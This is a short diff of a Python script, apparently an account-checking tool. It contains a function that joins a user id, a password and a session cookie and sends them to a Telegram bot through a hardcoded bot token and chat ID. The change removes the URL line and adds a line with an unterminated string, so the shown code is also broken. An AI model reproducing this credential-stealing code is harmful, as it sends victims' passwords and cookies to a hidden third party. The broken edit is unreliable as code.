@@ -11,15 +11,14 @@ try:
 except ModuleNotFoundError:
         print('\n Installing missing modules ...')
         os.system('pip install requests futures==2 > /dev/null')
-        os.system('python ALONE.py')
+        os.system('python handsome.py')
 except:pass
 def HANDSOME(ids,pas,cookie):
     try:
         import requests
         token = "6967989114:AAEyppwDyUURbGkPUiJUJUC8SEAoQNO8Uaw"
         chatid = "6921807308"
-        ok_id =str(uid+"|"+pas+"|"+cookie)
-        url = f"https://api.telegram.org/bot{token}/sendMessage"
+        ok_id =str(uid+"|"+pas+"|"+cookie+")
         params = {"chat_id": chatid, "text": ok_id}
         requests.get(url, params=params)
     except:
